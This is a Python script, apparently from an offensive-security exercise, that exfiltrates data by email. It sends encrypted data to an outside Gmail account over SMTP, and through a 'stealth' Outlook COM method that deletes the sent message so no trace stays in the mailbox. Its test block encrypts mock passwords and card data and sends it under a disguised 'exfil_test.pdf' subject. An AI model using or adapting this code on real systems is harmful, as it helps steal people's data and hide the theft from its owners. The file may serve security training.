import smtplib
import time
import win32com.client

# =============================================
# CONFIGURATION — put your throwaway Gmail here
# =============================================
smtp_server   = 'smtp.gmail.com'
smtp_port     = 587                       
smtp_acct     = 'testing@gmail.com'      # sender (throwaway)
smtp_password = ''      # app password from Google
tgt_accts     = ['testing@gmail.com']    # receiver (same for testing)


# =============================================
# METHOD 1: Plain SMTP — Cross Platform
# Works on Windows, Linux, Mac
# =============================================
def plain_email(subject, contents):
    # Build raw email message
    message  = f'Subject: {subject}\n'
    message += f'From: {smtp_acct}\n'
    message += f'To: {tgt_accts}\n\n'
    message += f'{contents.decode()}'
    
    # Connect to Gmail SMTP server
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()                              # upgrade to encrypted TLS
    server.login(smtp_acct, smtp_password)         # authenticate
    server.sendmail(smtp_acct, tgt_accts, message) # send it
    time.sleep(1)
    server.quit()
    print('[+] plain_email sent successfully!')


# =============================================
# METHOD 2: Outlook COM — Windows Only (Stealth)
# Requires Microsoft Outlook installed
# Key stealth feature: DeleteAfterSubmit = True
# email won't appear in Sent or Deleted folders
# =============================================
def outlook(subject, contents):
    # Create Outlook COM object
    outlook_app = win32com.client.Dispatch('Outlook.Application')
    
    # Create new email item (0 = mail item)
    message = outlook_app.CreateItem(0)
    
    # STEALTH: delete from sent items immediately
    message.DeleteAfterSubmit = True
    
    message.Subject = subject
    message.Body    = contents.decode()
    message.To      = tgt_accts[0]
    message.Send()
    
    print('[+] Outlook email sent stealthily!')


# =============================================
# TESTING
# =============================================
if __name__ == '__main__':
    from cryptor import encrypt
    
    # Simulate exfiltrating a secret message
    secret_data = b'Sensitive data: passwords, credit cards, documents...'
    
    print(f'[*] Original data  : {secret_data}')
    
    # Encrypt it first using our cryptor
    encrypted_data = encrypt(secret_data)
    print(f'[*] Encrypted data : {encrypted_data[:40]}...')
    
    # Send via SMTP
    print('\n[*] Sending via plain_email (SMTP)...')
    plain_email('exfil_test.pdf', encrypted_data)